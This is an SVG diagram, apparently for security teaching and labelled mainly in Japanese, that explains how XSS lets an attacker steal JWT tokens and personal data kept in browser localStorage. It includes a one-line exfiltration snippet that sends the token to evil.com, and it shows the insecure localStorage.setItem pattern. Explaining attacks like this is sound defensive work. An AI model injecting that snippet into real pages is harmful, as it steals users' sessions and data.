<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1100 750" font-family="'Segoe UI', 'Helvetica Neue', Arial, sans-serif">
  <defs>
    <linearGradient id="bgGrad" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#0f172a"/>
      <stop offset="100%" stop-color="#1e293b"/>
    </linearGradient>
    <filter id="glow">
      <feGaussianBlur stdDeviation="2.5" result="blur"/>
      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
    <filter id="shadow">
      <feDropShadow dx="0" dy="2" stdDeviation="4" flood-color="#000" flood-opacity="0.35"/>
    </filter>
    <marker id="arrowRed" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#ef4444"/>
    </marker>
    <marker id="arrowBlue" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#3b82f6"/>
    </marker>
    <marker id="arrowPurple" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#a855f7"/>
    </marker>
  </defs>

  <!-- Background -->
  <rect width="1100" height="750" fill="url(#bgGrad)" rx="12"/>

  <!-- ===== Title ===== -->
  <text x="380" y="38" text-anchor="middle" fill="#f8fafc" font-size="22" font-weight="700">Web Storage Abuse Attack Flow</text>
  <text x="380" y="58" text-anchor="middle" fill="#94a3b8" font-size="12">Web Storage&#24746;&#29992; &#8212; &#25915;&#25731;&#12398;&#27969;&#12428;</text>
  <rect x="280" y="66" width="200" height="20" rx="10" fill="#ef4444" opacity="0.15"/>
  <text x="380" y="80" text-anchor="middle" fill="#fca5a5" font-size="10" font-weight="600">OWASP A04 &#8212; Insecure Design</text>

  <!-- ====================================================== -->
  <!--  ACTORS                                                 -->
  <!-- ====================================================== -->

  <!-- Attacker -->
  <g transform="translate(115, 250)" filter="url(#shadow)">
    <rect x="-56" y="-30" width="112" height="125" rx="12" fill="#1e1b2e" stroke="#ef4444" stroke-width="1.5"/>
    <g transform="translate(0, 10)">
      <path d="M-13,-17 Q0,-28 13,-17 L13,-4 Q0,2 -13,-4 Z" fill="none" stroke="#ef4444" stroke-width="1.8"/>
      <circle cx="-4" cy="-9" r="1.8" fill="#ef4444"/>
      <circle cx="4" cy="-9" r="1.8" fill="#ef4444"/>
      <path d="M-17,36 Q-17,14 0,10 Q17,14 17,36" fill="none" stroke="#ef4444" stroke-width="2"/>
      <line x1="-17" y1="36" x2="17" y2="36" stroke="#ef4444" stroke-width="2" stroke-linecap="round"/>
    </g>
    <text x="0" y="72" text-anchor="middle" fill="#fca5a5" font-size="13" font-weight="700">&#25915;&#25731;&#32773;</text>
    <text x="0" y="86" text-anchor="middle" fill="#ef4444" font-size="9.5" opacity="0.7">Attacker</text>
  </g>

  <!-- Web Server (Vulnerable App) -->
  <g transform="translate(380, 250)" filter="url(#shadow)">
    <rect x="-56" y="-30" width="112" height="125" rx="12" fill="#1e1b2e" stroke="#3b82f6" stroke-width="1.5"/>
    <g transform="translate(0, 14)">
      <rect x="-20" y="-18" width="40" height="12" rx="3" fill="none" stroke="#3b82f6" stroke-width="1.5"/>
      <circle cx="-12" cy="-12" r="2" fill="#3b82f6"/><circle cx="-5" cy="-12" r="2" fill="#3b82f6"/>
      <rect x="-20" y="-2" width="40" height="12" rx="3" fill="none" stroke="#3b82f6" stroke-width="1.5"/>
      <circle cx="-12" cy="4" r="2" fill="#3b82f6"/><circle cx="-5" cy="4" r="2" fill="#3b82f6"/>
      <rect x="-20" y="14" width="40" height="12" rx="3" fill="none" stroke="#3b82f6" stroke-width="1.5"/>
      <circle cx="-12" cy="20" r="2" fill="#3b82f6"/><circle cx="-5" cy="20" r="2" fill="#3b82f6"/>
    </g>
    <text x="0" y="72" text-anchor="middle" fill="#93c5fd" font-size="13" font-weight="700">Web&#12469;&#12540;&#12496;&#12540;</text>
    <text x="0" y="86" text-anchor="middle" fill="#3b82f6" font-size="9.5" opacity="0.7">Vulnerable App</text>
  </g>

  <!-- Victim -->
  <g transform="translate(645, 250)" filter="url(#shadow)">
    <rect x="-56" y="-30" width="112" height="125" rx="12" fill="#1e1b2e" stroke="#a855f7" stroke-width="1.5"/>
    <g transform="translate(0, 10)">
      <circle cx="0" cy="-9" r="13" fill="none" stroke="#a855f7" stroke-width="1.8"/>
      <circle cx="-4" cy="-11" r="1.5" fill="#a855f7"/>
      <circle cx="4" cy="-11" r="1.5" fill="#a855f7"/>
      <path d="M-4,-4 Q0,1 4,-4" fill="none" stroke="#a855f7" stroke-width="1.3" stroke-linecap="round"/>
      <path d="M-17,36 Q-17,14 0,10 Q17,14 17,36" fill="none" stroke="#a855f7" stroke-width="2"/>
      <line x1="-17" y1="36" x2="17" y2="36" stroke="#a855f7" stroke-width="2" stroke-linecap="round"/>
    </g>
    <text x="0" y="72" text-anchor="middle" fill="#d8b4fe" font-size="13" font-weight="700">&#34987;&#23475;&#32773;</text>
    <text x="0" y="86" text-anchor="middle" fill="#a855f7" font-size="9.5" opacity="0.7">Victim</text>
  </g>

  <!-- ====================================================== -->
  <!--  ARROWS                                                 -->
  <!-- ====================================================== -->

  <!-- Step 1: Attacker → Server (XSS payload injection) -->
  <path d="M 171 240 L 324 240" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-dasharray="8,4" marker-end="url(#arrowRed)"/>
  <circle cx="248" cy="218" r="16" fill="#ef4444"/>
  <text x="248" y="223" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">1</text>

  <!-- Step 2: Server → Victim (upper line - XSS page served) -->
  <path d="M 436 240 L 589 240" fill="none" stroke="#3b82f6" stroke-width="2.2" stroke-dasharray="6,3" marker-end="url(#arrowBlue)"/>
  <circle cx="514" cy="218" r="16" fill="#3b82f6"/>
  <text x="514" y="223" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">2</text>

  <!-- Step 3: Victim internal (script reads localStorage - down arrow) -->
  <path d="M 645 345 L 645 410" fill="none" stroke="#a855f7" stroke-width="2.2" stroke-dasharray="6,3" marker-end="url(#arrowPurple)"/>
  <circle cx="669" cy="378" r="16" fill="#a855f7"/>
  <text x="669" y="383" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">3</text>

  <!-- Step 4: Victim internal (extract token - loop arrow) -->
  <path d="M 615 410 C 560 440, 560 475, 615 475" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-dasharray="8,4" marker-end="url(#arrowRed)"/>
  <circle cx="555" cy="440" r="16" fill="#ef4444"/>
  <text x="555" y="445" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">4</text>

  <!-- Step 5: Victim → Attacker (exfiltrate data - lower curve back) -->
  <path d="M 600 500 C 520 620, 250 620, 115 345" fill="none" stroke="#ef4444" stroke-width="2.2" stroke-dasharray="8,4" marker-end="url(#arrowRed)"/>
  <circle cx="330" cy="610" r="16" fill="#ef4444"/>
  <text x="330" y="615" text-anchor="middle" fill="#fff" font-size="13" font-weight="700">5</text>

  <!-- ====================================================== -->
  <!--  Victim browser box (localStorage read)                 -->
  <!-- ====================================================== -->
  <g transform="translate(645, 462)" filter="url(#shadow)">
    <rect x="-80" y="-28" width="160" height="84" rx="8" fill="#1e1b2e" stroke="#a855f7" stroke-width="1.2" stroke-dasharray="4,2"/>
    <rect x="-70" y="-20" width="140" height="13" rx="3" fill="#0f172a"/>
    <circle cx="-60" cy="-14" r="2.5" fill="#ef4444"/>
    <circle cx="-52" cy="-14" r="2.5" fill="#f59e0b"/>
    <circle cx="-44" cy="-14" r="2.5" fill="#22c55e"/>
    <text x="0" y="6" text-anchor="middle" fill="#d8b4fe" font-size="10" font-weight="600">localStorage&#12363;&#12425;&#35501;&#21462;</text>
    <text x="0" y="22" text-anchor="middle" fill="#94a3b8" font-size="8.5" font-family="'Fira Code', monospace">localStorage.getItem('token')</text>
    <text x="0" y="36" text-anchor="middle" fill="#ef4444" font-size="8.5">JWT&#12488;&#12540;&#12463;&#12531;&#12539;PII&#12364;&#21462;&#24471;&#21487;&#33021;</text>
    <text x="0" y="48" text-anchor="middle" fill="#94a3b8" font-size="8">XSS&#12395;&#12424;&#12426;&#20840;&#12487;&#12540;&#12479;&#12395;&#12450;&#12463;&#12475;&#12473;</text>
  </g>

  <!-- ===== Vulnerability callout ===== -->
  <g transform="translate(250, 320)" filter="url(#shadow)">
    <rect x="-110" y="-18" width="220" height="56" rx="8" fill="#451a03" stroke="#f97316" stroke-width="1"/>
    <text x="0" y="-1" text-anchor="middle" fill="#fdba74" font-size="11" font-weight="700">&#9888; &#27231;&#23494;&#24773;&#22577;&#12434;Web Storage&#12395;&#20445;&#23384;</text>
    <text x="0" y="16" text-anchor="middle" fill="#fb923c" font-size="9" font-family="'Fira Code', monospace">localStorage.setItem('token', jwt)</text>
    <text x="0" y="30" text-anchor="middle" fill="#fed7aa" font-size="8.5">XSS&#32076;&#30001;&#12391;JavaScript&#12363;&#12425;&#35501;&#12415;&#21462;&#12426;&#21487;&#33021;</text>
  </g>

  <!-- ===== Code snippet ===== -->
  <g transform="translate(380, 570)">
    <rect x="-230" y="-14" width="460" height="28" rx="5" fill="#0f172a" stroke="#334155" stroke-width="1"/>
    <text x="0" y="4" text-anchor="middle" fill="#94a3b8" font-size="9.5" font-family="'Fira Code', monospace">
      <tspan fill="#ef4444">new Image().src</tspan><tspan fill="#94a3b8"> = </tspan><tspan fill="#93c5fd">"https://evil.com/?t="</tspan><tspan fill="#fca5a5"> + localStorage.getItem('token')</tspan>
    </text>
  </g>

  <!-- ====================================================== -->
  <!--  STEP LIST (right sidebar)                              -->
  <!-- ====================================================== -->
  <g transform="translate(775, 100)">
    <rect x="0" y="0" width="305" height="360" rx="10" fill="#0f172a" stroke="#334155" stroke-width="1"/>
    <text x="152" y="28" text-anchor="middle" fill="#e2e8f0" font-size="14" font-weight="700">&#25915;&#25731;&#12473;&#12486;&#12483;&#12503;&#35443;&#32048;</text>
    <line x1="16" y1="40" x2="289" y2="40" stroke="#334155" stroke-width="1"/>

    <!-- Step 1 -->
    <circle cx="34" cy="68" r="13" fill="#ef4444"/>
    <text x="34" y="73" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">1</text>
    <text x="56" y="64" fill="#f8fafc" font-size="11.5" font-weight="600">XSS&#33030;&#24369;&#24615;&#12434;&#24746;&#29992;</text>
    <text x="56" y="80" fill="#94a3b8" font-size="9.5">&#25915;&#25731;&#32773;&#12364;XSS&#12506;&#12452;&#12525;&#12540;&#12489;&#12434;</text>
    <text x="56" y="93" fill="#94a3b8" font-size="9.5">&#33030;&#24369;&#12394;Web&#12450;&#12503;&#12522;&#12395;&#27880;&#20837;</text>

    <!-- Step 2 -->
    <circle cx="34" cy="124" r="13" fill="#3b82f6"/>
    <text x="34" y="129" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">2</text>
    <text x="56" y="120" fill="#f8fafc" font-size="11.5" font-weight="600">XSS&#12506;&#12540;&#12472;&#12395;&#12450;&#12463;&#12475;&#12473;</text>
    <text x="56" y="136" fill="#94a3b8" font-size="9.5">&#34987;&#23475;&#32773;&#12364;XSS&#12506;&#12452;&#12525;&#12540;&#12489;&#12434;</text>
    <text x="56" y="149" fill="#94a3b8" font-size="9.5">&#21547;&#12416;&#12506;&#12540;&#12472;&#12434;&#38322;&#35239;</text>

    <!-- Step 3 -->
    <circle cx="34" cy="180" r="13" fill="#a855f7"/>
    <text x="34" y="185" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">3</text>
    <text x="56" y="176" fill="#f8fafc" font-size="11.5" font-weight="600">localStorage&#12434;&#35501;&#12415;&#21462;&#12427;</text>
    <text x="56" y="192" fill="#94a3b8" font-size="9.5">&#24746;&#24847;&#12398;&#12354;&#12427;&#12473;&#12463;&#12522;&#12503;&#12488;&#12364;</text>
    <text x="56" y="205" fill="#94a3b8" font-size="9.5">&#12502;&#12521;&#12454;&#12470;&#12398;localStorage&#12434;&#35501;&#21462;</text>

    <!-- Step 4 -->
    <circle cx="34" cy="236" r="13" fill="#ef4444"/>
    <text x="34" y="241" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">4</text>
    <text x="56" y="232" fill="#f8fafc" font-size="11.5" font-weight="600">&#12488;&#12540;&#12463;&#12531;/PII&#12434;&#25277;&#20986;</text>
    <text x="56" y="248" fill="#94a3b8" font-size="9.5">JWT&#12488;&#12540;&#12463;&#12531;&#12420;&#20491;&#20154;&#24773;&#22577;&#12434;</text>
    <text x="56" y="261" fill="#94a3b8" font-size="9.5">Web Storage&#12363;&#12425;&#25277;&#20986;</text>

    <!-- Step 5 -->
    <circle cx="34" cy="292" r="13" fill="#ef4444"/>
    <text x="34" y="297" text-anchor="middle" fill="#fff" font-size="11" font-weight="700">5</text>
    <text x="56" y="288" fill="#f8fafc" font-size="11.5" font-weight="600">&#25915;&#25731;&#32773;&#12398;&#12469;&#12540;&#12496;&#12540;&#12395;&#36865;&#20449;</text>
    <text x="56" y="304" fill="#94a3b8" font-size="9.5">&#31397;&#21462;&#12375;&#12383;&#12487;&#12540;&#12479;&#12434;&#22806;&#37096;&#12469;&#12540;&#12496;&#12540;</text>
    <text x="56" y="317" fill="#94a3b8" font-size="9.5">&#12408;&#36865;&#20449;&#12375;&#12289;&#12450;&#12459;&#12454;&#12531;&#12488;&#20055;&#21462;&#12426;</text>
    <text x="56" y="343" fill="#64748b" font-size="8.5">&#8251; &#34987;&#23475;&#32773;&#12399;&#12487;&#12540;&#12479;&#31397;&#21462;&#12395;&#27671;&#12389;&#12363;&#12394;&#12356;</text>
  </g>

  <!-- ====================================================== -->
  <!--  ATTACK TECHNIQUE CARDS (bottom)                        -->
  <!-- ====================================================== -->
  <line x1="30" y1="630" x2="1070" y2="630" stroke="#334155" stroke-width="1"/>
  <text x="550" y="655" text-anchor="middle" fill="#fca5a5" font-size="14" font-weight="700">&#128293; &#20351;&#29992;&#12373;&#12428;&#12427;&#25915;&#25731;&#12486;&#12463;&#12491;&#12483;&#12463;</text>

  <!-- Card: XSS経由のストレージ読取 -->
  <g transform="translate(165, 668)" filter="url(#shadow)">
    <rect x="-120" y="0" width="240" height="38" rx="8" fill="#1e1b2e" stroke="#ef4444" stroke-width="1"/>
    <rect x="-108" y="6" width="28" height="26" rx="5" fill="#ef4444" opacity="0.1"/>
    <text x="-94" y="24" text-anchor="middle" fill="#ef4444" font-size="11" font-family="'Fira Code', monospace">&lt;/&gt;</text>
    <text x="10" y="16" text-anchor="middle" fill="#f8fafc" font-size="11" font-weight="600">XSS&#32076;&#30001;&#12398;&#12473;&#12488;&#12524;&#12540;&#12472;&#35501;&#21462;</text>
    <text x="10" y="30" text-anchor="middle" fill="#94a3b8" font-size="8.5">localStorage/sessionStorage&#12408;&#12450;&#12463;&#12475;&#12473;</text>
  </g>

  <!-- Card: JWTトークン窃取 -->
  <g transform="translate(465, 668)" filter="url(#shadow)">
    <rect x="-120" y="0" width="240" height="38" rx="8" fill="#1e1b2e" stroke="#ef4444" stroke-width="1"/>
    <rect x="-108" y="6" width="28" height="26" rx="5" fill="#ef4444" opacity="0.1"/>
    <g transform="translate(-94, 19)">
      <rect x="-8" y="-6" width="16" height="12" rx="2" fill="none" stroke="#ef4444" stroke-width="1.2"/>
      <path d="M-5,-2 L-5,-7 Q-5,-12 0,-12 Q5,-12 5,-7 L5,-2" fill="none" stroke="#ef4444" stroke-width="1.2"/>
      <circle cx="0" cy="1" r="1.5" fill="#ef4444"/>
    </g>
    <text x="10" y="16" text-anchor="middle" fill="#f8fafc" font-size="11" font-weight="600">JWT&#12488;&#12540;&#12463;&#12531;&#31397;&#21462;</text>
    <text x="10" y="30" text-anchor="middle" fill="#94a3b8" font-size="8.5">&#35469;&#35388;&#12488;&#12540;&#12463;&#12531;&#12391;&#12450;&#12459;&#12454;&#12531;&#12488;&#20055;&#21462;&#12426;</text>
  </g>

  <!-- Card: 個人情報の漏洩 -->
  <g transform="translate(765, 668)" filter="url(#shadow)">
    <rect x="-120" y="0" width="240" height="38" rx="8" fill="#1e1b2e" stroke="#ef4444" stroke-width="1"/>
    <rect x="-108" y="6" width="28" height="26" rx="5" fill="#ef4444" opacity="0.1"/>
    <g transform="translate(-94, 19)">
      <circle cx="0" cy="-3" r="6" fill="none" stroke="#ef4444" stroke-width="1.2"/>
      <path d="M4,1 L8,5" stroke="#ef4444" stroke-width="1.5" stroke-linecap="round"/>
    </g>
    <text x="10" y="16" text-anchor="middle" fill="#f8fafc" font-size="11" font-weight="600">&#20491;&#20154;&#24773;&#22577;&#12398;&#28431;&#27945;</text>
    <text x="10" y="30" text-anchor="middle" fill="#94a3b8" font-size="8.5">PII&#12487;&#12540;&#12479;&#12398;&#22806;&#37096;&#36865;&#20449;&#12539;&#24746;&#29992;</text>
  </g>

  <!-- ===== Legend ===== -->
  <g transform="translate(775, 490)">
    <rect x="0" y="0" width="305" height="86" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
    <text x="14" y="18" fill="#94a3b8" font-size="10" font-weight="600">&#20961;&#20363;</text>
    <line x1="14" y1="34" x2="44" y2="34" stroke="#ef4444" stroke-width="2" stroke-dasharray="6,3"/>
    <text x="52" y="38" fill="#fca5a5" font-size="9.5">&#25915;&#25731;&#36890;&#20449;</text>
    <line x1="152" y1="34" x2="182" y2="34" stroke="#3b82f6" stroke-width="2" stroke-dasharray="6,3"/>
    <text x="190" y="38" fill="#93c5fd" font-size="9.5">&#12469;&#12540;&#12496;&#12540;&#24540;&#31572;</text>
    <line x1="14" y1="54" x2="44" y2="54" stroke="#a855f7" stroke-width="2"/>
    <text x="52" y="58" fill="#d8b4fe" font-size="9.5">&#34987;&#23475;&#32773;&#12398;&#12502;&#12521;&#12454;&#12470;</text>
    <rect x="152" y="48" width="12" height="12" rx="2" fill="#451a03" stroke="#f97316" stroke-width="0.8"/>
    <text x="170" y="58" fill="#fdba74" font-size="9.5">&#33030;&#24369;&#24615;&#12509;&#12452;&#12531;&#12488;</text>
    <rect x="14" y="68" width="12" height="12" rx="2" fill="#1e1b2e" stroke="#ef4444" stroke-width="0.8"/>
    <text x="32" y="78" fill="#fca5a5" font-size="9.5">&#12487;&#12540;&#12479;&#25277;&#20986;&#12509;&#12452;&#12531;&#12488;</text>
  </g>

</svg>